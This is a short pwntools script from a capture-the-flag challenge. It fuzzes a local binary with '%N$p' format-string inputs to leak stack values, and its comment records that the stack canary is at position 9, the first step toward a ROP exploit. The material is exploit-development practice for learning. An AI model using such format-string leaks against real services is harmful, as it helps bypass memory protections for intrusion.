#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'warn'
host = 'beginners-rop-pwn.wanictf.org'
port = 9006


# =========================================================
#                          FUZZ
# =========================================================
for i in range(0, 45):
    try:
        io = process(exe)
        io.sendlineafter(b'Do you agree with me? : ', f'%{i}$p'.encode())
        leak = io.recvline().decode().strip()
        if 'null' not in leak:
            print(f"{i}:", leak)
        io.close()
    except EOFError or UnicodeDecodeError:
        pass

# canary found at %9$p